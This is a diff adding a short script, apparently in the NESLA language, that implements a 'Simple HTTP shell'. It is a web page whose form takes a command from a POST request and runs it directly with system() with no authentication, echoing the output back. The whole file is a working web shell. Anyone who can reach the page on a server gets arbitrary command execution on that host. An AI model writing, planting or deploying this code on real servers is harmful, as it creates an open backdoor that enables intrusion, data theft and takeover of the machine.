@@ -1,0 +1,42 @@
+if (string.cmp(type(_SERVER), 'null')==0) {
+	global _SERVER = { REQUEST_METHOD="GET", SCRIPT_NAME="/nesla/blah" }
+} # this is a debug block
+if (string.cmp(_SERVER['REQUEST_METHOD'], "POST")==0) {
+	var path=_POST['path'];
+	var command=_POST['command'];
+} else {
+	var path=_filepath;
+	var command="ps auxw";
+}
+print(
+	"<HTML>\n",
+	"<TITLE>Simple HTTP shell</TITLE>\n",
+	"<HEAD>\n",
+	"<STYLE TYPE=text/css>\n",
+	"A        { color: #0000FF; text-decoration: none; }\n",
+	"A:HOVER  { background-color: #E0E0FF; }\n",
+	"</STYLE>\n",
+	"</HEAD>\n",
+	"<BODY>\n",
+	"<CENTER>\n",
+	"<FORM ACTION='", _SERVER['SCRIPT_NAME'], "' METHOD='POST' NAME='shell'>\n",
+	"<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0 BGCOLOR='#E0E0E0'>\n",
+	"<TR><TD>Path   </TD><TD><INPUT SIZE=50 NAME='path'    VALUE='", path, "'></TD></TR>\n",
+	"<TR><TD>Command</TD><TD><INPUT SIZE=50 NAME='command' VALUE='", command, "'></TD></TR>\n",
+	"<TR><TD ALIGN=CENTER COLSPAN=2><input type='submit' value='go' name='submit'></TD></TR>\n",
+	"</TABLE>\n",
+	"</FORM>\n",
+	"</CENTER>\n",
+	"<PRE>\n"
+);
+system(command);
+print(
+	"</PRE>\n",
+	"<SCRIPT LANGUAGE=JavaScript>\n",
+	"<!--\n",
+	"document.shell.command.focus();\n",
+	"// -->\n",
+	"</SCRIPT>\n",
+	"</BODY>\n",
+	"</HTML>\n"
+);
